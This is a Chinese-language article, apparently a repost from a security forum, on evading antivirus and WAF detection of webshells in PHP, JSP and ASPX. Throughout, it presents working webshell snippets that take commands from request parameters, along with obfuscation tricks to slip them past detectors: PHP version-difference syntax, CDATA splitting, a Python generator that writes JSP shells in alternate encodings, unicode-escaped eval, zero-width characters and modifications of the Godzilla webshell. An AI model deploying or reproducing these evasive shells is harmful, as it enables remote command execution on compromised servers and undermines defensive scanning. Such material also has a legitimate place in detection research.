### 作者：Icepaper  
原文地址：[https://xz.aliyun.com/t/10937](https://xz.aliyun.com/t/10937)

## PHP的免杀技巧

在传统的PHP免杀中，通常使用代码变形和从外部获取参数来避开检测。然而，针对一些先进的WAF（Web应用防火墙）和防火墙，不管如何变形，它们最终还是能够检测出命令执行的位置。而如果在语法上出错，就有可能导致解析失败。本文介绍了几种通过利用PHP版本差异来制造语义错误，达到命令执行的方式。

### 1. 在高版本PHP中利用不换行的语法执行命令

```php
<?=  
$a = <<< aa  
assasssasssasssasssasssasssasssasssasssassss  
aa;
echo `whoami`;
?>
```

- **PHP 5.2**：报错
- **PHP 5.3**：报错
- **PHP 5.4**：报错
- **PHP 7.3.4**：成功执行命令

### 2. 使用 `\` 特殊符号引起报错

```php
<?php  
\echo `whoami`;
?>
```

- **PHP 5.2**：成功执行命令
- **PHP 5.3**、**PHP 7.3**：执行失败

### 3. 利用十六进制字符串

在PHP 7中不再将十六进制字符串识别为数字，但PHP 5仍然认为是数字。

```php
<?php  
$s = substr("aabbccsystem", "0x6");  
$s('whoami');
?>
```

- **PHP 5.2**、**PHP 7.3**：执行失败
- **PHP 5.3**、**PHP 5.5**：成功执行命令

通过这些不同版本的差异，可以绕过一些未能对所有版本进行检测的WAF。

### 4. 结合垃圾数据和变形混淆构造更多Payload

可以结合垃圾数据、变形混淆，以及大量特殊字符和注释，构造更多绕过防护的Payload。例如，PHP 7.0中的 `??` 运算符，如果PHP版本为5.x就会报错，可以结合其他方式来绕过。

```php
<?php  
$a = $_GET['function'] ?? 'whoami';  
$b = $_GET['cmd'] ?? 'whoami';  
$a(null.(null.$b));
```

## JSP的免杀技巧

由于作者对Java不太深入，这里分享几个小技巧：

### 1. JSP和JSPX兼容性

- JSP文件的后缀可以兼容JSPX格式，也兼容JSPX的所有特性，如CDATA特性。
- 但JSPX文件的后缀无法兼容JSP格式代码。

### 2. 使用CDATA

在XML元素中，`<` 和 `&` 是非法字符，因此可以将包含这些字符的脚本代码定义在 `<![CDATA[]]>` 中，解析器会忽略CDATA部分内容。

例如：
```jsp
String cmd = request.getPar<![CDATA[ameter]]>("shell");
```

此时 `ameter` 会和 `getPar` 拼接成为 `getParameter`。

### 3. 利用Java支持的其他编码格式

可以使用其他字符编码格式来绕过防护，例如使用 `utf-16be`、`utf-16le` 和 `cp037`。

```python
# python2
charset = "utf-8"  
data = '''<%Runtime.getRuntime().exec(request.getParameter("i"));%>'''.format(charset=charset)

f16be = open('utf-16be.jsp','wb')  
f16be.write('<%@ page contentType="charset=utf-16be" %>')  
f16be.write(data.encode('utf-16be'))

f16le = open('utf-16le.jsp','wb')  
f16le.write('<jsp:directive.page contentType="charset=utf-16le"/>')  
f16le.write(data.encode('utf-16le'))

fcp037 = open('cp037.jsp','wb')  
fcp037.write(data.encode('cp037'))  
fcp037.write('<%@ page contentType="charset=cp037"/>')
```

可以看到对于D盾的绕过效果还是很好的。

## ASPX的免杀技巧

ASPX的免杀方式相对较少，这里列出5种绕过方式：

1. Unicode编码
2. 空字符串连接
3. 使用 `<%%>` 语法
4. 头部替换
5. 特殊符号 `@`
6. 注释

### 1. 使用Unicode编码

例如将 `eval` 变为 `\u0065\u0076\u0061\u006c`：
```aspx
<%@ Page Language="Jscript"%><%\u0065\u0076\u0061\u006c(@Request.Item["pass"],"unsafe");%>
```

- 在JScript中，不支持大写U和多个0的增加，而在C#中则可以支持。

### 2. 空字符串连接

在函数字符串中插入以下字符，不会影响脚本的正常运行：
- `\u200c`、`\u200d`、`\u200e`、`\u200f`

### 3. 使用 `<%%>` 语法

将整个字符串与函数用 `<%%>` 分割：
```aspx
<%@Page Language=JS%><%eval%><%(Request.%><%Item["pass"],"unsafe");%>
```

### 4. 头部替换

可以将 `<%@ Page Language="Jscript"%>` 修改为 `<%@Page Language=JS%>`，也可以将其移到代码的其他位置。

### 5. 使用特殊符号 `@`

例如在哥斯拉webshell中添加 `@` 符号，来改变其特征但不影响解析：
```aspx
(Context.Session["payload"] == null)  
(@Context.@Session["payload"] == null)
```

### 6. 注释随意插入

在代码中可以任意插入注释，例如：
```aspx
<%/*qi*/Session./*qi*/Add(@"k"/*qi*/,/*qi*/"e45e329feb5d925b"/*qi*/);
```
这种方式也可以与 `<%%>` 结合使用，效果更好。